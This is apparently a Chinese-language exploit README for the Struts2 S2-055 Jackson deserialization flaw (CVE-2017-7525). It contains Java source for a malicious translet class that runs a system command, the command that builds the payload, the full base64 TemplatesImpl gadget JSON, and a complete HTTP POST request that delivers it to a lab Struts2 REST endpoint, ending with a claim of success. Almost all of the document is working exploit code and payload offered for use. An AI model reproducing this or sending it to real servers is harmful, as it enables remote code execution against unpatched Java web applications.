# S2-055 反序列化漏洞Exploit CVE-2017-7525 

#### 首先感谢廖师傅提供的测试环境 https://github.com/shengqi158/S2-055-PoC

#### 本exploit我和我的同事ahmatjan一起完成。 https://github.com/ahmatjan/

利用过程

javac ExploitCommand.java

```
package exploit;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.*;

public class ExploitCommand extends AbstractTranslet {
	
	public ExploitCommand() throws Exception {

		try {
			BufferedReader br = null;
			// ExploitCommand
			Process p = Runtime.getRuntime().exec("calc");
			br = new BufferedReader(new InputStreamReader(p.getInputStream()));

			String line = null;
			StringBuilder sb = new StringBuilder();
			while ((line = br.readLine()) != null) {
				sb.append(line + "\n");
				System.out.println(sb.toString());
			}
			System.out.println("\n[*] Payload Fuck Tomcat!!!!");
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public static void main(String[] args) throws Exception {
		ExploitCommand exp = new ExploitCommand();
	}

	@Override
	public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

	}

	@Override
	public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
			throws TransletException {

	}
}
```
java -jar Jackson-S2-055-Exploit.jar ExploitCommand.class clientName
```
root@secfree> java -jar Jackson-S2-055-Exploit.jar ExploitCommand.class clientName

[*] www.secfree.com By Bearcat
[*] Jackson S2-055 Exploit
[+] Payload:

{"clientName":["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"transletBytecodes":["yv66vgAAADMAXwoAFwAtCgAuAC8IADAKAC4AMQcAMgcAMwoANAA1CgAGADYKAAUANwcAOAoACgAtCgAFADkKAAoAOggAOwoACgA8CQA9AD4KAD8AQAgAQQcAQgoAEwBDBwBECgAVAC0HAEUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQcARAcAMgcARgcARwcAOAcAQgEACkV4Y2VwdGlvbnMHAEgBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgcASQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApTb3VyY2VGaWxlAQATRXhwbG9pdENvbW1hbmQuamF2YQwAGAAZBwBKDABLAEwBAARjYWxjDABNAE4BABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcARgwATwBQDAAYAFEMABgAUgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABTAFQMAFUAVgEAAQoMAFcAVAcAWAwAWQBaBwBbDABcAF0BABwKWypdIFBheWxvYWQgRnVjayBUb21jYXQhISEhAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAXgAZAQAWZXhwbG9pdC9FeHBsb2l0Q29tbWFuZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABFqYXZhL2xhbmcvUHJvY2VzcwEAEGphdmEvbGFuZy9TdHJpbmcBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAPcHJpbnRTdGFja1RyYWNlACEAFQAXAAAAAAAEAAEAGAAZAAIAGgAAAO8ABQAFAAAAbiq3AAEBTLgAAhIDtgAETbsABVm7AAZZLLYAB7cACLcACUwBTrsAClm3AAs6BCu2AAxZTsYAKhkEuwAKWbcACy22AA0SDrYADbYAD7YADVeyABAZBLYAD7YAEaf/07IAEBIStgARpwAITCu2ABSxAAEABABlAGgAEwACABsAAAA6AA4AAAANAAQAEAAGABIADwATACIAFQAkABYALQAXADYAGABPABkAXQAbAGUAHgBoABwAaQAdAG0AHwAcAAAAJwAE/wAtAAUHAB0HAB4HAB8HACAHACEAAC//AAoAAQcAHQABBwAiBAAjAAAABAABACQACQAlACYAAgAaAAAAJQACAAIAAAAJuwAVWbcAFkyxAAAAAQAbAAAACgACAAAAIgAIACMAIwAAAAQAAQAkAAEAJwAoAAIAGgAAABkAAAADAAAAAbEAAAABABsAAAAGAAEAAAAoACMAAAAEAAEAKQABACcAKgACABoAAAAZAAAABAAAAAGxAAAAAQAbAAAABgABAAAALgAjAAAABAABACkAAQArAAAAAgAs"],"transletName":"p","outputProperties":{ },"_name":"a","_version":"1.0","allowedProtocols":"all"}]}
```
发送Paylaod
```
POST http://192.168.199.130:8887/struts2-rest-showcase/orders HTTP/1.1
Host: 192.168.199.130:8887
Connection: keep-alive
Cache-Control: max-age=0
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=ED7D0B24093F642D6FBBCD81B1878721
If-None-Match: 1
Content-Length: 2680

{"clientName":["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"transletBytecodes":["yv66vgAAADMAXwoAFwAtCgAuAC8IADAKAC4AMQcAMgcAMwoANAA1CgAGADYKAAUANwcAOAoACgAtCgAFADkKAAoAOggAOwoACgA8CQA9AD4KAD8AQAgAQQcAQgoAEwBDBwBECgAVAC0HAEUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQcARAcAMgcARgcARwcAOAcAQgEACkV4Y2VwdGlvbnMHAEgBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgcASQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApTb3VyY2VGaWxlAQATRXhwbG9pdENvbW1hbmQuamF2YQwAGAAZBwBKDABLAEwBAARjYWxjDABNAE4BABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcARgwATwBQDAAYAFEMABgAUgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABTAFQMAFUAVgEAAQoMAFcAVAcAWAwAWQBaBwBbDABcAF0BABwKWypdIFBheWxvYWQgRnVjayBUb21jYXQhISEhAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAXgAZAQAWZXhwbG9pdC9FeHBsb2l0Q29tbWFuZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABFqYXZhL2xhbmcvUHJvY2VzcwEAEGphdmEvbGFuZy9TdHJpbmcBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAPcHJpbnRTdGFja1RyYWNlACEAFQAXAAAAAAAEAAEAGAAZAAIAGgAAAO8ABQAFAAAAbiq3AAEBTLgAAhIDtgAETbsABVm7AAZZLLYAB7cACLcACUwBTrsAClm3AAs6BCu2AAxZTsYAKhkEuwAKWbcACy22AA0SDrYADbYAD7YADVeyABAZBLYAD7YAEaf/07IAEBIStgARpwAITCu2ABSxAAEABABlAGgAEwACABsAAAA6AA4AAAANAAQAEAAGABIADwATACIAFQAkABYALQAXADYAGABPABkAXQAbAGUAHgBoABwAaQAdAG0AHwAcAAAAJwAE/wAtAAUHAB0HAB4HAB8HACAHACEAAC//AAoAAQcAHQABBwAiBAAjAAAABAABACQACQAlACYAAgAaAAAAJQACAAIAAAAJuwAVWbcAFkyxAAAAAQAbAAAACgACAAAAIgAIACMAIwAAAAQAAQAkAAEAJwAoAAIAGgAAABkAAAADAAAAAbEAAAABABsAAAAGAAEAAAAoACMAAAAEAAEAKQABACcAKgACABoAAAAZAAAABAAAAAGxAAAAAQAbAAAABgABAAAALgAjAAAABAABACkAAQArAAAAAgAs"],"transletName":"p","outputProperties":{ },"_name":"a","_version":"1.0","allowedProtocols":"all"}]}
```
利用成功

![exploit](https://github.com/iBearcat/S2-055/blob/master/exploit.gif?raw=true)
